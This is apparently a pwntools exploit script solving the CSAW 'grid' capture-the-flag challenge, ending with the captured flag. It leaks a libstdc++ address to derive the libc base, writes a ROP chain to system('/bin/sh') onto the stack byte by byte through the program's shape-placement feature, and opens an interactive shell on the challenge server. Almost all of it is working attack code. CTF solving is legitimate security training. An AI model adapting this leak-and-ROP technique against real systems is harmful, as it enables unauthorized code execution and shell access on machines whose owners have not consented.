from pwn import *


def create_shape(ch, x, y):
    io.recvuntil(b'shape> ')
    io.sendline(ch)
    io.recvuntil(b'loc> ')
    io.sendline(b'%d %d' % (x, y))


def prepare_overwrite_stack(value, offset):
    print('Send {}, {}'.format(hex(value), offset))
    for i, b in enumerate(p64(value)):
        create_shape(bytes([b]), 0, 0x78 + offset * 8 + i)


def display():
    io.recvuntil(b'shape> ')
    io.sendline(b'd')
    io.recvuntil(b'Displaying\n')
    data = io.recv(109)
    sanitized = b''
    for i in range(10):
        sanitized += data[i * 11: (i + 1) * 11 - 1]
    return sanitized


binpath = './grid'
elf = ELF(binpath)
libc = elf.libc


context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = '''
gef
# call loop
# b *0x0000000000400DB3
# Overwrite byte
# b *0x0000000000400B16
# display
# b *0x400AA9
# just before ret
b *0x0000000000400BBF
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('pwn.chal.csaw.io', 5013)

data = display()
# addr_libstdcpp = u64(data[0x18:0x20]) - 0x10fc2f  # local
addr_libstdcpp = u64(data[0x18:0x20]) - 0xfb5da  # remote
addr_libc = addr_libstdcpp - 0x3f1000
print('addr_libstdcpp: 0x{:x}'.format(addr_libstdcpp))
print('addr_libc: 0x{:x}'.format(addr_libc))

addr_pop_rdi = 0x0000000000400ee3
addr_pop_rsi_r15 = 0x0000000000400ee1
addr_ret = 0x00000000004008ae

rop = []
rop.append(addr_ret)
rop.append(addr_pop_rdi)
rop.append(addr_libc + next(libc.search(b'/bin/sh')))
rop.append(addr_libc + libc.symbols['system'])
for i, v in enumerate(rop):
    prepare_overwrite_stack(v, i)

input()
io.recvuntil(b'shape> ')
io.sendline(b'd')


io.interactive()

# flag{but_4ll_l4ngu4g3s_R_C:(}
